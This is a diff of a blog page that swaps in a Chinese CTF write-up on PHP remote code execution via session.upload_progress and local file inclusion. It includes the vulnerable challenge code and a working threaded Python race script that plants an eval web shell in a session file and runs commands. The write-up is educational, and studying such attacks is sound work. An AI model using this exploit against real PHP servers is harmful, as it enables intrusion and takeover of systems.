@@ -11,7 +11,7 @@
 
     <title>
         
-          《机器学习实战》笔记——决策树 - ca01h&#39;s Blog
+          session.upload_progress+LFI实现RCE - ca01h&#39;s Blog
         
     </title>
 
@@ -107,6 +107,7 @@ document.addEventListener('DOMContentLoaded', function () {
 <li><a href="/Web_security/php_related/9.%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0PHP%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8">PHP无参数函数的利用</a></li>
 <li><a href="/Web_security/php_related/10.%E5%88%A9%E7%94%A8SoapClient%E7%B1%BB%E8%BF%9B%E8%A1%8CSSRF-CRLF%E6%94%BB%E5%87%BB">SoapClient+SSRF+CRLF利用</a></li>
 <li><a href="/Web_security/php_related/12.PHP%E7%9A%84LFI%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93">PHP LFI to RCE</a></li>
+<li><a href="/Web_security/php_related/13.session.upload-progress+LFI%E5%AE%9E%E7%8E%B0RCE">session.upload-progress+LFI实现RCE</a></li>
 </ul>
 <h2 id="Writeups">Writeups</h2>
 <ul>
@@ -290,14 +291,53 @@ function sidebar_toggle() {
 
         </div>
         <div class="book-content">
-          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-<div class="book-post">
+          <div class="book-post">
   
-  <i class="fas fa-calendar-day"></i>&nbsp;2020-09-15&nbsp;
-  <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span><span> times</span>&nbsp;
-  <i class="fas fa-file-word"></i>&nbsp;<span class="post-count">0</span>
+  <i class="fas fa-calendar-day"></i>&nbsp;2020-10-19&nbsp;
+  <i class="fas fa-file-word"></i>&nbsp;<span class="post-count">792</span>
   
-  
+  <h1 id="PHP-session-upload-process-LFI实现RCE">PHP session.upload_process + LFI实现RCE</h1>
+<blockquote>
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://tgaout.github.io/2019/05/29/%E5%88%A9%E7%94%A8session-upload-progress%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B8%97%E9%80%8F/">https://tgaout.github.io/2019/05/29/利用session-upload-progress进行文件包含和反序列化渗透/</a></p>
+</blockquote>
+<p>这篇文章主要记录参考文章的复现环节，知识点部分简单介绍。</p>
+<h2 id="0x01-PHP关于upload-process配置介绍">0x01 PHP关于upload_process配置介绍</h2>
+<p>本文提到的PHP配置中关于session.upload_process主要是下面四个：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">session.upload_progress.enabled &#x3D; on</span><br><span class="line">session.upload_progress.cleanup &#x3D; on</span><br><span class="line">session.upload_progress.prefix &#x3D; &quot;upload_progress_&quot;</span><br><span class="line">session.upload_progress.name &#x3D; &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>
+<p><code>enabled=on</code>表示当浏览器向服务器上传文件的时候，PHP会把本次文件上传的详细信息存储在session中；</p>
+</li>
+<li>
+<p><code>cleanup=on</code>表示上传结束后，PHP会立即清空对应的session文件中的内容；</p>
+</li>
+<li>
+<p>关于<code>prefix</code>和<code>name</code>两个选项，PHP文档中有详细说明：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201018095115.png" alt=""></p>
+</li>
+</ul>
+<h2 id="0x02-upload-progress-文件包含实现RCE">0x02 upload_progress + 文件包含实现RCE</h2>
+<h3 id="示例代码">示例代码</h3>
+<p>直接从一道CTF题目入手：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 21:20:43</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">define(<span class="string">&#x27;还要秀？&#x27;</span>, dirname(<span class="keyword">__FILE__</span>));</span><br><span class="line">set_include_path(还要秀？);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    $file = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>ban掉了常见的文件包含伪协议，这个时候我们可以利用<code>session.upload_progress</code>将恶意代码写入session文件，从而包含session文件。</p>
+<p>现在还存在两个问题：首先没有代码中没有<code>session_start()</code>如何创建session文件；第二个问题，由于<code>session.upload_progress.cleanup=on</code>，当文件上传结束后，session文件的内容被自动清除，如何进行RCE？</p>
+<h3 id="session-use-strict-mode">session.use_strict_mode</h3>
+<p>关于第一个问题，session还有一个默认配置：<code>session.use_strict_mode=0</code>，意思就是用户可以自定义Session ID。具体而言，我们在Cookie中设置<code>Cookie:PHPSESSID=ca01h</code>，PHP将会在服务器上session存储的位置创建一个文件<code>session_ca01h</code>，即使用户没有初始化Session，PHP也会自动初始化Session，并且产生一个键值，这个键值由<code>session.upload_progress.prefix</code>+<code>session.upload_progress_name</code>组成，最后被写入sess_文件中。</p>
+<h3 id="条件竞争">条件竞争</h3>
+<p>为了赶在session文件被清除之前进行RCE，可以通过上传一个大文件进行条件竞争。</p>
+<h3 id="解题">解题</h3>
+<p>本来是想直接写一个脚本Getshell的，结果一直没能调试出来，只能用burp抓包intrude了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;&quot;&quot;http://7a4916f9-18d7-4ecf-bed3-302ed44c5763.chall.ctf.show/index.php&quot;&quot;&quot;</span></span><br><span class="line">sessid = <span class="string">&quot;ca01h&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;cmd&quot;</span>: <span class="string">&quot;system(&#x27;ls&#x27;);&quot;</span>&#125;</span><br><span class="line">proxy = &#123;<span class="string">&quot;http&quot;</span>: <span class="string">&quot;127.0.0.1:8080&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span>)</span><br><span class="line">        resp = session.post(url=url, data=&#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="string">&quot;&lt;?php eval($_POST);?&gt;&quot;</span>&#125;,</span><br><span class="line">                            files=&#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&quot;ca01h.txt&quot;</span>, f)&#125;, cookies=&#123;<span class="string">&quot;PHPSESSID&quot;</span>: sessid&#125;, proxies=proxy)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.post(url=url+<span class="string">&quot;?file=/tmp/sess_&quot;</span>+sessid, data=data, proxies=proxy)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;ca01h.txt&quot;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            print(resp.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;[++++++]Retry&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br><span class="line">    event.set()</span><br></pre></td></tr></table></figure>
+<p>burp抓包</p>
+<p>文件上传请求包：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201018120147.png" alt=""></p>
+<p>执行命令请求包：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201018120341.png" alt=""></p>
+<p>条件竞争爆破</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201018120536.png" alt=""></p>
+
 </div>
 
 
@@ -347,12 +387,23 @@ function sidebar_toggle() {
     <!-- Author title
     <div class="author-title">
       <div>ca01h</div>
-      <div>2020-09-15</div>
+      <div>2020-10-19</div>
     </div> -->
 	
 	<script src="https://www.hackthebox.eu/badge/212159"></script>
   </div> 
 
+  
+    <div class="divider"></div>
+
+    <div class="link">
+	  <i class="fas fa-folder-open"></i>&nbsp;
+      <a class="category-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a>-><a class="category-link" href="/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/">基础学习</a>
+	  </br>
+	  <i class="fas fa-tags"></i>&nbsp;
+      <a class="tag-none-link" href="/tags/PHP/" rel="tag">#PHP</a> <a class="tag-none-link" href="/tags/web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/" rel="tag">#web安全学习</a>
+    </div>
+    
   
 
   <div class="divider"></div>
